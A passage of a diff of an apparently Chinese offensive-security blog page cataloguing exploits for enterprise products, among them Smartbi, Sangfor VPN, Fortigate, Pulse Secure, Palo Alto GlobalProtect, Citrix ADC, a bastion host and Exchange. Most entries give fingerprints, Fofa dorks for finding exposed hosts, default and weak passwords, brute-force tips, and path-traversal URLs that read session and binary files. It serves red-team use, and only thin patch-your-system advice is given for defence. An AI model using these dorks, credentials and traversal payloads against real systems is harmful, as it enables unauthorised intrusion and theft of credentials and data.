+    <span class="hljs-string">"v"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"C"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"y"</span>, 
+}
+
+DECODING_SCHEDULE = {
+    <span class="hljs-string">"7"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"!"</span>, 
+    <span class="hljs-string">"/"</span>: <span class="hljs-string">"%"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">")"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"."</span>, <span class="hljs-string">"O"</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"C"</span>, 
+    <span class="hljs-string">"T"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"x"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"v"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>, 
+    <span class="hljs-string">"o"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"P"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">"Q"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"Z"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"X"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"Y"</span>, 
+    <span class="hljs-string">"U"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"~"</span>: <span class="hljs-string">"b"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"e"</span>, <span class="hljs-string">"_"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"g"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"j"</span>, 
+    <span class="hljs-string">"G"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"w"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"0"</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"D"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"k"</span>: <span class="hljs-string">"t"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"u"</span>, 
+    <span class="hljs-string">"g"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"y"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"y"</span>: <span class="hljs-string">"_"</span>, 
+}
+
+<span class="hljs-meta">#此函数可以用来加密明文也可以解密服务器返回的密文</span>
+<span class="hljs-function">def <span class="hljs-title">encode</span>(<span class="hljs-params">code</span>):</span>
+<span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:
+        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + ENCODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span>
+
+<span class="hljs-function">def <span class="hljs-title">decode</span>(<span class="hljs-params">code</span>):</span>
+<span class="hljs-function">    <span class="hljs-keyword">out</span></span> = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> code:
+        <span class="hljs-keyword">out</span> = <span class="hljs-keyword">out</span> + DECODING_SCHEDULE.<span class="hljs-keyword">get</span>(item, item)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span></code></pre>
 
 <p>2.该系统还有几处漏洞, 比如默认口令</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">demo/demo</span><br><span class="line"></span><br><span class="line">manager/demo</span><br><span class="line"></span><br><span class="line">admin/admin</span><br><span class="line"></span><br><span class="line">admin/manager</span><br><span class="line"></span><br><span class="line">admin/2manager</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs nsis">demo/demo
+
+manager/demo
+
+<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span>
+
+<span class="hljs-literal">admin</span>/manager
+
+<span class="hljs-literal">admin</span>/<span class="hljs-number">2</span>manager</code></pre>
 
 <p>3.默认路径</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:18080/smartbi/vision/config.jsp` 可能未修改密码或者密码为`manager</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1:18080/smartbi</span><span class="hljs-regexp">/vision/config</span>.jsp<span class="hljs-string">` 可能未修改密码或者密码为`</span>manager</code></pre>
 
 <p>4.进入后台目录遍历</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C%3A%2F</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs xquery">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">18080</span>/smartbi/vision/chooser.jsp<span class="hljs-built_in">?key</span>=CONFIG_FILE_DIR<span class="hljs-built_in">&amp;root</span>=C<span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span></code></pre>
 
 <p>同样是后台可以加载插件, 怎么getshell不用我多说了吧</p>
 <p><strong>8. 防护方法</strong></p>
@@ -501,15 +862,18 @@
 <p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p>
 <p><strong>2. 影响组件</strong><br>深信服 VPN</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: TWFID=</span><br><span class="line">welcome to ssl vpn</span><br><span class="line">Sinfor</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs delphi"><span class="hljs-keyword">Set</span>-Cookie: TWFID=
+welcome <span class="hljs-keyword">to</span> ssl vpn
+Sinfor</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header="Set-Cookie: TWFID="</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">"Set-Cookie: TWFID="</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>深信服vpnweb登录逆向学习 – potatso – 博客园<br><a href="https://www.cnblogs.com/potatsoSec/p/12326356.html" target="_blank" rel="noopener">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -t %d -T %d --spider %s</span><br><span class="line">分析一下上面文章就ok, 比较简单的命令注入</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs cos">wget -t <span class="hljs-built_in">%d</span> -T <span class="hljs-built_in">%d</span> --spider <span class="hljs-built_in">%s</span>
+分析一下上面文章就ok, 比较简单的命令注入</code></pre>
 
 <p><strong>7. 利用技巧</strong></p>
 <p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p>
@@ -522,24 +886,38 @@
 <p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p>
 <p><strong>2. 影响组件</strong><br>深信服 VPN</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/por/login_auth.csp?apiversion=1</span><br><span class="line">sangfor</span><br><span class="line">/cgi-bin/login.cgi?rnd=</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk"><span class="hljs-regexp">/por/</span>login_auth.csp?apiversion=<span class="hljs-number">1</span>
+sangfor
+<span class="hljs-regexp">/cgi-bin/</span>login.cgi?rnd=</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="深信服-SSL-VPN"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"深信服-SSL-VPN"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区<br><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633</a></p>
 <p>此处存疑, 时间问题没有测试</p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf8</span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">import re</span><br><span class="line">session = requests.session()</span><br><span class="line">def SanForLogin(target, password, username="admin"):</span><br><span class="line">    # 加密密码的算法是 sha1(password+sid)</span><br><span class="line">    # 没有公开POC就不写了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SanForLogin("https://xxxxxxxxxxx/", "admin")</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs python"><span class="hljs-comment">#encoding=utf8</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> urllib3
+urllib3.disable_warnings()
+<span class="hljs-keyword">import</span> re
+session = requests.session()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SanForLogin</span><span class="hljs-params">(target, password, username=<span class="hljs-string">"admin"</span>)</span>:</span>
+    <span class="hljs-comment"># 加密密码的算法是 sha1(password+sid)</span>
+    <span class="hljs-comment"># 没有公开POC就不写了</span>
+
+
+SanForLogin(<span class="hljs-string">"https://xxxxxxxxxxx/"</span>, <span class="hljs-string">"admin"</span>)</code></pre>
 
 <p><strong>7. 利用技巧</strong></p>
 <p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多</p>
 <p>国外APT组织应该也批量爆破了一波</p>
 <p>加密的密码也就是 <code>sha1(password+sid)</code></p>
 <p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/123456/Sangfor/Sangfor@123</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">admin/<span class="hljs-number">123456</span>/Sangfor/<span class="hljs-symbol">Sangfor@</span><span class="hljs-number">123</span></code></pre>
 
 <p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p>
 <p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧</p>
@@ -551,10 +929,11 @@
 <p>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p>
 <p><strong>2. 影响组件</strong><br>Fortigate SSL VPN</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fortigate</span><br><span class="line">4tinet2095866</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">Fortigate
+<span class="hljs-number">4</span>tinet2095866</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"Fortigate" &amp;&amp; port=10443</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs routeros"><span class="hljs-string">"Fortigate"</span> &amp;&amp; <span class="hljs-attribute">port</span>=10443</code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN<br><a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1" target="_blank" rel="noopener">https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p>
@@ -565,17 +944,17 @@
 <p>milo2012/CVE-2018-13382: CVE-2018-13382<br><a href="https://github.com/milo2012/CVE-2018-13382" target="_blank" rel="noopener">https://github.com/milo2012/CVE-2018-13382</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.文件读取的路径构造</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span>dev<span class="hljs-regexp">/cmdb/</span>sslvpn_websession</code></pre>
 
 <p>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print("/../../../../"+(raw_input().rjust(35, '/')))</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs lisp">print(<span class="hljs-string">"/../../../../"</span>+(<span class="hljs-name">raw_input</span>().rjust(<span class="hljs-number">35</span>, '/')))</code></pre>
 
 <p>2.寻找魔术数字</p>
 <p>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/remote/</span>fgt_lang?lang=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/bin/</span>sslvpnd</code></pre>
 
 <p>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xxxxx:<span class="hljs-number">10443</span><span class="hljs-regexp">/sslvpn/</span>js<span class="hljs-regexp">/login.js?q=5f9a6877fd1f78da768239aae6e739c2</span></code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -585,10 +964,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Pulse Secure SSL VPN</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pulse Secure SSL VPN</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Pulse Secure SSL VPN</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="PulseSecure-SSL-VPN"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PulseSecure-SSL-VPN"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/185773" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185773</a></p>
@@ -603,10 +982,10 @@
 <p>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p>
 <p><strong>2. 影响组件</strong><br>Palo Alto GlobalProtect</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GlobalProtect Portal</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs arcade">GlobalProtect <span class="hljs-built_in">Portal</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="PaloAlto-GlobalProtect"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"PaloAlto-GlobalProtect"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!<br><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p>
@@ -615,10 +994,12 @@
 <p>securifera/CVE-2019-1579<br><a href="https://github.com/securifera/CVE-2019-1579" target="_blank" rel="noopener">https://github.com/securifera/CVE-2019-1579</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这个扫描的话可以判断</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/global-protect/portal/css/login.css`</span><br><span class="line">`/images/logo_pan_158.gif</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk"><span class="hljs-regexp">/global-protect/</span>portal<span class="hljs-regexp">/css/</span>login.css`
+`<span class="hljs-regexp">/images/</span>logo_pan_158.gif</code></pre>
 
 <p><code>Last-Modified</code> 是否早于于2018年</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified</span><br><span class="line">Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">curl -s -I https:<span class="hljs-comment">//sslvpn/global-protect/portal/css/login.css | grep Last-Modified</span>
+Last-Modified: Sun, <span class="hljs-number">10</span> Sep <span class="hljs-number">2017</span> <span class="hljs-number">16</span>:<span class="hljs-number">48</span>:<span class="hljs-number">23</span> GMT</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -628,10 +1009,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Citrix Gateway/ADC</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Citrix Gateway/ADC</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs avrasm">Citrix Gateway/<span class="hljs-keyword">ADC</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Citrix-Netscaler"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Citrix-Netscaler"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232752.html</a></p>
@@ -639,7 +1020,7 @@
 <p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781" target="_blank" rel="noopener">https://github.com/trustedsec/cve-2019-19781</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.通过以下命令可以快速断定</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs crystal">curl <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/host/vpn</span><span class="hljs-regexp">/../vpns</span><span class="hljs-regexp">/cfg/smb</span>.conf --path-<span class="hljs-keyword">as</span>-is --insecure</code></pre>
 
 <p>这里部分版本不需要进行<code>../</code>跳转也可以, 具体原因没有分析</p>
 <p><strong>8. 防护方法</strong></p>
@@ -650,10 +1031,10 @@
 <p>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p>
 <p><strong>2. 影响组件</strong><br>齐治堡垒机</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shterm</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">shterm</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="shterm-堡垒机"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"shterm-堡垒机"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>审计某系统从解密到GetShell – 云+社区 – 腾讯云<br><a href="https://cloud.tencent.com/developer/article/1448700" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1448700</a></p>
@@ -672,10 +1053,11 @@
 <p>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p>
 <p><strong>2. 影响组件</strong><br>Exchange</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exchange</span><br><span class="line">outlook</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Exchange</span>
+<span class="hljs-attribute">outlook</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Microsoft-Exchange"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Microsoft-Exchange"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/195162.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/195162.html</a></p>
@@ -688,10 +1070,16 @@
 <p><strong>7. 利用技巧</strong></p>
 <p>1.寻找企业的Exchange有个技巧</p>
 <p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mail.domain.com</span><br><span class="line">mail1.domain.com</span><br><span class="line">mail-hk.domain.com</span><br><span class="line">owa.domain.com</span><br><span class="line">exchange.domain.com</span><br><span class="line">email.domain.com</span><br><span class="line">outlook.domain.com</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs css"><span class="hljs-selector-tag">mail</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
+<span class="hljs-selector-tag">mail1</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
+<span class="hljs-selector-tag">mail-hk</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
+<span class="hljs-selector-tag">owa</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
+<span class="hljs-selector-tag">exchange</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
+<span class="hljs-selector-tag">email</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span>
